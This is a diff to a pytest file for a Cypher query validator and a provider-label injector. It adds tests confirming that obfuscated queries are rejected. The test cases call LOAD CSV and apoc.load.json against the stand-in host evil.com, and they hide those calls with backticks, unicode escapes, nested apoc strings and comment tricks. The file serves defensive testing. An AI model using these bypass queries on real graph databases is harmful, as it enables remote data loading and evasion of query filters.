@@ -222,6 +222,19 @@ class TestProtection:
         result = _inject(cypher)
         assert result.count(LABEL) == 1
 
+    def test_quote_inside_backtick_identifier_does_not_open_a_string(self):
+        cypher = "WITH 1 AS `a'` MATCH (n:AWSRole) RETURN n //'"
+        result = inject_provider_label(cypher, PROVIDER_ID)
+        assert f"(n:AWSRole:{LABEL})" in result
+
+    def test_carriage_return_ends_a_line_comment(self):
+        cypher = "RETURN 1 // note\rMATCH (n:AWSRole) RETURN n"
+        result = inject_provider_label(cypher, PROVIDER_ID)
+        assert f"(n:AWSRole:{LABEL})" in result
+
+    def test_escaped_backslash_before_u_in_string_is_allowed(self):
+        validate_custom_query("MATCH (n:AWSRole) WHERE n.path = 'C:\\\\users' RETURN n")
+
     def test_block_comment_with_node_pattern(self):
         cypher = "MATCH (n:AWSRole) /* (m:Fake)\n(k) */ RETURN n"
         result = _inject(cypher)
@@ -469,6 +482,50 @@ class TestValidation:
         ],
     )
     def test_rejects_blocked_patterns_split_by_comments_or_whitespace(self, cypher):
+        with pytest.raises(ValidationError) as exc:
+            validate_custom_query(cypher)
+
+        assert "blocked operation" in str(exc.value.detail)
+
+    @pytest.mark.parametrize(
+        "cypher",
+        [
+            "CALL `apoc`.`load`.json('http://evil.com/') YIELD value RETURN value",
+            "CALL apoc.`load`.json('http://evil.com/') YIELD value RETURN value",
+            "WITH 1 AS `a'` LOAD CSV FROM \"http://evil.com/\" AS x RETURN x //'",
+            "CALL apoc.when(true, 'LOAD CSV FROM \"http://evil.com/\" AS x RETURN x',"
+            " '', {}) YIELD value RETURN value",
+            'CALL apoc.case([true, \'CALL apoc.load.json("http://evil.com/")'
+            " YIELD value RETURN value'], '', {}) YIELD value RETURN value",
+            "CALL apoc.graph.fromCypher('MATCH (n) RETURN n', {}, 'g', {})"
+            " YIELD graph RETURN graph",
+            "L\\u004fAD CSV FROM 'http://evil.com/' AS x RETURN x",
+            "RETURN 'a\\u0027 LOAD CSV FROM \"http://evil.com/\" AS x RETURN x //'",
+            "WITH 1 AS `a`LOAD CSV FROM 'http://evil.com/' AS x RETURN x",
+            "CALL`apoc`.`load`.json('http://evil.com/') YIELD value RETURN value",
+            "L\\u+004fAD CSV FROM 'http://evil.com/' AS x RETURN x",
+            "RETURN 1 // note\rLOAD CSV FROM 'http://evil.com/' AS x RETURN x",
+            "RETURN 'a\\\n' LOAD CSV FROM \"http://evil.com/\" AS x RETURN x //'",
+        ],
+        ids=[
+            "apoc.load_backticked_namespace",
+            "apoc.load_backticked_segment",
+            "LOAD_CSV_after_backtick_identifier_with_quote",
+            "LOAD_CSV_inside_apoc.when_string",
+            "apoc.load_inside_apoc.case_string",
+            "apoc.graph.fromCypher",
+            "LOAD_CSV_spelled_with_unicode_escape",
+            "string_closed_by_unicode_escape",
+            "LOAD_CSV_glued_to_backtick_identifier",
+            "apoc.load_backticked_glued_to_CALL",
+            "LOAD_CSV_spelled_with_signed_unicode_escape",
+            "LOAD_CSV_after_line_comment_ended_by_carriage_return",
+            "LOAD_CSV_after_string_with_escaped_newline",
+        ],
+    )
+    def test_rejects_blocked_patterns_hidden_by_backticks_or_nested_queries(
+        self, cypher
+    ):
         with pytest.raises(ValidationError) as exc:
             validate_custom_query(cypher)
 
